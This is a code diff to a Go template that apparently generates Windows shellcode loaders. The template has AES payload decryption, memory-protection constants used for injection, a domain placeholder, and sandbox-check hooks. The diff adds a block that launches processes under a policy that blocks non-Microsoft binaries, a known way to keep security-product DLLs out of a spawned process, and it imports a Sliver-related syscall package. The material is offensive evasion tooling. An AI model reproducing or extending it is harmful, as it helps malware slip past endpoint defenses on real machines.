@@ -48,6 +48,8 @@ import (
 	{{.Import}}
 
 	{{.BoxChkImp}}
+
+	{{.LeetImp}}
 )
 
 func pkcs5Trimming(encrypt []byte) []byte {
@@ -89,16 +91,8 @@ func aesDecrypt(key string, buf string) ([]byte, error) {
 
 }
 
-const (
-	// MEM_COMMIT is a Windows constant used with Windows API calls
-	MEM_COMMIT = 0x1000
-	// MEM_RESERVE is a Windows constant used with Windows API calls
-	MEM_RESERVE = 0x2000
-	// PAGE_EXECUTE_READ is a Windows constant used with Windows API calls
-	PAGE_EXECUTE_READ = 0x20
-	// PAGE_READWRITE is a Windows constant used with Windows API calls
-	PAGE_READWRITE = 0x04
-)
+{{.MemCom}}
+
 var hope = "{{.Domain}}"
 
 {{.Extra}}
@@ -108,6 +102,7 @@ var hope = "{{.Domain}}"
 {{.ProcAttach}}
 
 func init() {
+	{{.BlockNonMs}}
 	{{.ChkBox}}	
 	{{.Init}}
 }
@@ -147,4 +142,34 @@ const dtypeRemote = `
 const dtypeChild = `
 	program := "{{.ChildProc}}"
 	args := "{{.Args}}"
+`
+const BlockNonMs = `
+	procThreadAttributeSize := uintptr(0)
+	_ = syscalls.InitializeProcThreadAttributeList(nil, 2, 0, &procThreadAttributeSize)
+	procHeap, _ := syscalls.GetProcessHeap()
+	attributeList, _ := syscalls.HeapAlloc(procHeap, 0, procThreadAttributeSize)
+	defer syscalls.HeapFree(procHeap, 0, attributeList)
+	var startupInfo syscalls.StartupInfoEx
+	startupInfo.AttributeList = (*syscalls.PROC_THREAD_ATTRIBUTE_LIST)(unsafe.Pointer(attributeList))
+	_ = syscalls.InitializeProcThreadAttributeList(startupInfo.AttributeList, 2, 0, &procThreadAttributeSize)
+	mitigate := 0x20007 //"PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY"
+
+	nonms := uintptr(0x100000000000)     //"PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON"
+
+	_ = syscalls.UpdateProcThreadAttribute(startupInfo.AttributeList, 0, uintptr(mitigate), &nonms, unsafe.Sizeof(nonms), 0, nil)
+`
+const LeetImports = `
+	syscalls "github.com/sh4hin/GoPurple/sliverpkg"
+`
+const MemCom = `
+const (
+	// MEM_COMMIT is a Windows constant used with Windows API calls
+	MEM_COMMIT = 0x1000
+	// MEM_RESERVE is a Windows constant used with Windows API calls
+	MEM_RESERVE = 0x2000
+	// PAGE_EXECUTE_READ is a Windows constant used with Windows API calls
+	PAGE_EXECUTE_READ = 0x20
+	// PAGE_READWRITE is a Windows constant used with Windows API calls
+	PAGE_READWRITE = 0x04
+)
 `
